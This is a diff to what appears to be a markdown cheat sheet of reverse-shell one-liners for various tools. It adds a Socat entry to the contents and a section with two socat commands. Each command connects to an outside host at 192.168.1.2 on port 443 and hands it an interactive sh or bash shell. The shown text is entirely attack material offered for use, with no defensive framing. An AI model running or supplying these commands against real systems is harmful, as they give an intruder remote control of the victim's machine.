@@ -35,6 +35,7 @@
 - [<kbd>Ruby</kbd>](#Ruby)
 - [<kbd>Xterm](#Xterm)
 - [<kbd>Ncat</kbd>](#Ncat)
+- [<kbd>Socat</kbd>](#Socat)
 - [<kbd>PowerShell</kbd>](#PowerShell)
 - [<kbd>Awk</kbd>](#Awk)
 - [<kbd>Gawk</kbd>](#Gawk)
@@ -480,7 +481,15 @@
   ```
    
   ---
-  
+  # <kbd>Socat</kbd>
+   
+  ```cmd
+  socat TCP:192.168.1.2:443 EXEC:sh
+   
+  socat TCP:192.168.1.2:443 EXEC:'bash -li',pty,stderr,setsid,sigint,sane 
+  ```
+   
+  --- 
   # <kbd>PowerShell</kbd>
 
   ```powershell
